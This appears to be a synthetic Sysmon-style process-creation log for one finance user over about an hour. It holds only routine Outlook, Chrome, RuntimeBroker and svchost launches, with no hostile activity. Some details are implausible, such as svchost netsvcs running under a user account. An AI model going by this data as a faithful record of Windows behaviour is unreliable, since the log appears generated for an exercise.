UtcTime,EventID,Image,ParentImage,User,CommandLine,TargetImage,DestinationIp,QueryName
2026-05-11 08:30:19.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:30:42.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:31:19.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:31:23.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:31:41.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:31:57.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:32:36.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:33:02.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:33:18.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:33:28.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:34:07.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:34:44.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:34:50.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:35:03.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:35:28.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:36:04.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:36:34.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:37:04.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:37:10.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:37:34.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:38:14.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:38:34.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:38:50.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:38:54.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:39:06.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:39:32.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:39:58.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:40:03.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:40:32.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:41:02.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:41:41.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:41:50.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:42:29.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:42:46.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:43:00.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:43:20.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:43:40.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:43:46.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:44:21.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:44:31.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:45:05.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:45:17.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:45:54.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:46:31.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:46:54.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:47:29.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:48:08.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:48:22.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:48:38.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:48:44.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:48:58.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:49:33.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:50:11.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:50:29.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:50:59.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:51:35.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:51:38.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:51:44.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:51:52.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:51:56.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:52:14.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:52:36.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:53:11.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:53:32.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:53:52.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:54:27.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:54:52.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:55:23.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:55:38.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:55:42.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:55:54.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:56:14.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:56:31.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 08:56:35.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:57:05.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:57:26.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:58:06.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:58:30.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:59:00.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:59:35.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:59:56.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:00:08.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:00:17.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:00:26.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:00:42.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:00:45.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:01:18.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:01:58.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:02:26.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:02:46.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:03:02.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:03:15.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:03:44.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:04:13.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:04:32.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:05:06.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:05:36.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:06:09.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:06:25.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:06:35.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:06:49.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:07:08.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:07:11.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:07:46.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:08:17.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:08:22.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:08:43.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:09:14.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:09:42.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:10:20.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:10:55.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:11:30.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:11:56.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:12:06.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:12:11.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:12:32.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:12:59.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:13:32.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:14:02.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:14:06.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:14:27.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:14:36.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:15:07.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:15:44.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:15:47.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:15:57.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:16:07.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:16:46.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:17:06.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:17:45.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:18:07.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:18:44.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:19:18.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:19:38.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:20:14.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:20:40.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:21:20.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:21:25.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:21:50.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:22:22.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:23:00.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:23:12.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:23:43.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:24:05.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:24:37.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:24:58.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:25:25.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:25:39.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:25:58.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:26:37.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:27:09.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:27:42.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:28:05.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:28:39.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:28:57.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:29:34.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:30:07.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:30:14.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:30:42.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:31:06.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:31:19.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:31:43.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:31:49.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:31:52.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:31:56.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:32:34.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:32:40.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:33:03.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:33:17.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:33:42.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:34:10.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:34:37.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:35:04.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:35:27.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:35:42.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:36:14.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:36:23.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
